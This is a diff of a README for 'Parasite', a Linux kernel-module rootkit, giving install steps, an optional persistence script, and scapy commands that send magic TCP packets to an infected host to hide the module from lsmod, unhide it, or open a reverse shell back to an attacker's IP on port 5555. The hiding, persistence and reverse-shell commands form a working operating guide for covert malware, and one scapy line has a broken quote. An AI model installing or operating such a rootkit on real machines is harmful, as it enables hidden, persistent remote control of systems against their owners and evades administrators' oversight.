@@ -4,11 +4,13 @@ This is a rootkit written in the form of a Linux kernel module (LKM), which curr
 ## Installation
 NOTE - Read the disclaimer if you haven't already. Additionally, it is *highly recommended* that you use this in a VM!
 
-Works with kernel versions 5.0 and greater, tested and built natively on 5.4.0
+Works with kernel versions 5.0 and greater, tested and built natively on 5.4.0 (Ubuntu/Debian)
 
-1. Update system and ensure linux-headers is installed
+The following steps assume that you have already assumed root
+
+1. Update your system via your respective packaeg-manager, and ensure linux-headers is installed
 ```sh
-apt update && install linux-headers-$(uname -r) -y
+apt update && apt upgrade && apt install linux-headers-$(uname -r) -y
 ```
 
 2. Clone repo (or download manually)
@@ -25,14 +27,14 @@ make
 
 4. OPTIONAL: Establish persistence with the rootkit
 ```sh
-chmod +x ./persist.sh
+chmod +x persist.sh
 
 ./persist.sh
 ```
 
 5. Install the module
 ```sh
-insmod LKM.ko
+insmod Parasite.ko
 ```
 
 ## Usage
@@ -45,26 +47,23 @@ lsmod | grep Parasite
 
 By default, Parasite listens for TCP packets on port 6969. The rootkit has 3 options that can be used: hide, show, and reverse shell. It doesn't matter how you send the packet, but personally I used scapy. 
 
-Note: You *must* replace **INSERT_IP** with the LKM machine's IP
+Note: You *must* replace **INSERT_IP** with the rootkit-infected machine's IP
 
 
 
 - ROOTKIT_HIDE - Hides the module from lsmod, thus inherently prevents it from being removed via rmmod as well
 ```
-data='ROOTKIT_HIDE'
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_HIDE'))
 ```
 
 - ROOTKIT_SHOW - Puts LKM back into list, thus allowing for removal via rmmod
 ```
-data='ROOTKIT_SHOW'
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_SHOW'))
 ```
 
 - ROOTKIT_RSHELL127.0.0.1 - This spawns a reverse shell using your IP (change 127.0.0.1 to your IP). You will need to be listening for port 5555 (default) on your machine to catch the shell
 ```
-data='ROOTKIT_RSHELL127.0.0.1
-sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load=data))
+sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='ROOTKIT_RSHELL127.0.0.1))
 ```
 
 ## Uninstallation
